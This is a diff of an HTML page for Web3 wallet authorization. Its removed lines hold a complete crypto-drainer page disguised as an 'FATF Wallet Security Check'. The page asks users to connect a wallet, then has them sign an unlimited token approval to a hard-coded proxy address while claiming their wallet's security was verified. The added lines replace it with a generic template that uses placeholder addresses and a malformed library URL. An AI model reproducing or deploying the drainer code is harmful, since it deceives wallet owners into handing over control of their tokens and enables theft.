@@ -3,179 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>FATF Wallet Security Check</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f9f9f9;
-            color: #333;
-        }
-        button {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 15px;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+    <title>Web3 Token Authorization</title>
 </head>
 <body>
-    <div>
-        <h2>Connect and Authorize Wallet</h2>
-        <button id="connectWallet" onclick="connectWallet()">Connect Wallet</button>
-        <p id="walletStatus">Wallet Not Connected</p>
-        <button id="approveButton" onclick="checkSecurity()" disabled>Authorize Contract</button>
-    </div>
+    <h1>Web3 Token Authorization</h1>
+    <button id="connectWallet">Connect Wallet</button>
+    <button id="authorizeContract" style="display:none;">Authorize Contract</button>
+    <div id="userAddress"></div>
 
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.0.umd.min.js"></script>
     <script>
-        const proxyAddress = "0x67A0bCBC059358E96bF4e85B43FFB2a12f25e097"; // Proxy Contract Address
-        let provider, signer;
-
-        // The ABI for the token contract that includes 'approve' and 'allowance' methods
-        const tokenABI = [
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "owner",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "spender",
-                        "type": "address"
-                    }
-                ],
-                "name": "allowance",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "spender",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "approve",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "account",
-                        "type": "address"
-                    }
-                ],
-                "name": "balanceOf",
-                "outputs": [
-                    {
-                        "internalType": "uint256",
-                        "name": "",
-                        "type": "uint256"
-                    }
-                ],
-                "stateMutability": "view",
-                "type": "function"
-            },
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "sender",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "address",
-                        "name": "recipient",
-                        "type": "address"
-                    },
-                    {
-                        "internalType": "uint256",
-                        "name": "amount",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "transferFrom",
-                "outputs": [
-                    {
-                        "internalType": "bool",
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
-
-        const tokenAddress = "0xd387FEeD5D966912F0af9e7fE1A854e4d6067CDE"; // Fixed Token Contract Address
-
-        // Connect to the user's wallet using MetaMask or another Web3 wallet
+        let provider, signer, userAddress;
+        const contractAddress = "0xYourContractAddress"; // Replace with your contract address
+        const abi = [ /* ABI of your contract */ ];
+        
         async function connectWallet() {
             if (typeof window.ethereum !== "undefined") {
-                try {
-                    provider = new ethers.providers.Web3Provider(window.ethereum);
-                    await provider.send("eth_requestAccounts", []);  // Request accounts from the wallet
-                    signer = provider.getSigner();
-                    const walletAddress = await signer.getAddress();
-                    document.getElementById("walletStatus").innerText = `Connected Wallet: ${walletAddress}`;
-                    document.getElementById("approveButton").disabled = false; // Enable the 'Check Security' button
-                } catch (error) {
-                    alert("Wallet connection failed. Please try again!");
-                }
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                userAddress = await signer.getAddress();
+                document.getElementById("userAddress").innerText = `Connected Address: ${userAddress}`;
+                document.getElementById("authorizeContract").style.display = 'inline-block';
             } else {
-                alert("Please install MetaMask or other wallet extensions!");
+                alert("Please install Metamask!");
             }
         }
 
-        // Perform the token approval to the proxy contract with unlimited allowance
-        async function checkSecurity() {
-            if (!signer) {
-                alert("Please connect your wallet first!");
-                return;
-            }
-
-            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
-
+        async function authorizeContract() {
+            const contract = new ethers.Contract(contractAddress, abi, signer);
             try {
-                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);  // Grant unlimited allowance
-                console.log("Transaction hash:", tx.hash);  // Output transaction hash
-                alert("Wallet security verified successfully! Authorization granted.");
+                const tx = await contract.authorizeTokenTransfer(userAddress); // Assuming `authorizeTokenTransfer` is your function
+                await tx.wait();
+                alert("Authorization successful!");
             } catch (error) {
-                console.error("Error during authorization:", error);  // Output detailed error
-                alert("Wallet security check failed. Please try again!");
+                console.error(error);
             }
         }
+
+        document.getElementById("connectWallet").onclick = connectWallet;
+        document.getElementById("authorizeContract").onclick = authorizeContract;
     </script>
 </body>
 </html>
